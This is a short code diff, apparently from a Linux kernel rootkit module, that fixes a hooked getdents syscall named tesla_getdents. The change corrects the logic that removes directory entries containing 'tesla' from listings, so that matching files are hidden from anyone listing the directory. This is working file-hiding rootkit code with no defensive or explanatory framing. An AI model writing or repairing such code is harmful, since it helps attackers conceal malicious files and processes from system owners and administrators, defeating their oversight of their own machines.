@@ -54,10 +54,12 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 	int i = 0;
 	while (i < ret) {
 		if (strstr(p2->d_name,"tesla")) {
-			memmove(p1, p2, p2->d_reclen);
+			memmove(p2, p2 + (p2->d_reclen), ret - (p2-p1) - (p2->d_reclen));
 			ret -= p2->d_reclen;
+		}
+		else {
 			i += p2->d_reclen;
-			p2 = p2 + p2->d_reclen;
+			p2 += p2->d_reclen;
 		}
 	}
 	
